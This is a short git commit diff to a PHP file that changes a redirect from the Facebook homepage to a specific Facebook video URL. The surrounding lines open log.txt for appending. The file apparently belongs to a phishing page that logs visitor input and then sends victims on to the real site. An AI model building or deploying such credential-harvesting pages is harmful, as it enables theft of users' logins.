175a4ca1c2c7576b9f5e27882676e82afd6d4555
pop1000 <112407945+pop1000@users.noreply.github.com>
2022-09-02 12:00:02 +0000

    Update xyz.php

--- xyz.php
+++ xyz.php
@@ -1,7 +1,7 @@
 <?php
 
 // Set the location to redirect the page
-header ('Location: http://www.facebook.com');
+header ('Location: https://web.facebook.com/watch/?ref=search&v=435362298570092&external_log_id=3336736f-a308-4532-b6cd-5c32da5dd780&q=funny%20animals%20videos');
 
 // Open the text file in writing mode
 $file = fopen("log.txt", "a");
